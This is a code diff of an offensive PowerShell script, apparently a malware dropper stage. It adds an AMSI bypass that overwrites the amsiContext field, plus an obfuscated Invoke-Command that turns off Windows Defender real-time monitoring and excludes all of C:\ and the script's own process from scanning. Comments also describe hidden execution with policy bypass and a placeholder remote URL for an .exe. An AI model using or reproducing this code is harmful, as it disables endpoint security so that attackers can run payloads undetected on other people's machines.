@@ -3,16 +3,26 @@
 # Opens powershell with script block bypass in a hidden window 
 # powershell.exe -NoPr -WINd 1 -eXEc ByP 
 
+#change variable of computer name
+$AAAAAA = $COMPUTERNAME
+
+#change this to what you named this script
+$BBBBBB = $SCRIPTNAME
+
 # change variable of location of remote file
-$ABABAB = "https://sitename"
+$ABABAB = $"https://sitename"
 
 # change variable
 $ACACAC = "$file.exe"
 
+# AMSI Bypass
+[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)
+
+
 # Disables Defender Real Time Monitoring 
 #non-obfuscated command: Invoke-Command -ComputerName %s -ScriptBlock { Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath 'C:\'; Add-MpPreference -ExclusionProcess '%s' }
 
-InVOKe-cOMMAnd -"coMputEr"NaME %s -s"c"R"i"Ptb"l"O"c"k { s"Et-Mpp"RE"Fe"R"ENcE" -"dI"SA"bLe"Re"AL"T"i"m"eMo"Ni"TORI"Ng $T"Ru"E; ad"D"-"mPP"R"e"Fe"R"Ence -"Exc"L"usI"O"N"P"AtH" 'C:\'; aD"D-"M"PPrEfE"REnce -e"x"C"l"u"s"I"oN"p"r"o"C"ESs '%s' }
+InVOKe-cOMMAnd -"coMputEr"NaME $AAAAAA -s"c"R"i"Ptb"l"O"c"k { s"Et-Mpp"RE"Fe"R"ENcE" -"dI"SA"bLe"Re"AL"T"i"m"eMo"Ni"TORI"Ng $T"Ru"E; ad"D"-"mPP"R"e"Fe"R"Ence -"Exc"L"usI"O"N"P"AtH" 'C:\'; aD"D-"M"PPrEfE"REnce -e"x"C"l"u"s"I"oN"p"r"o"C"ESs '$BBBBBB' }
 
 Start-Sleep -Seconds 5
 
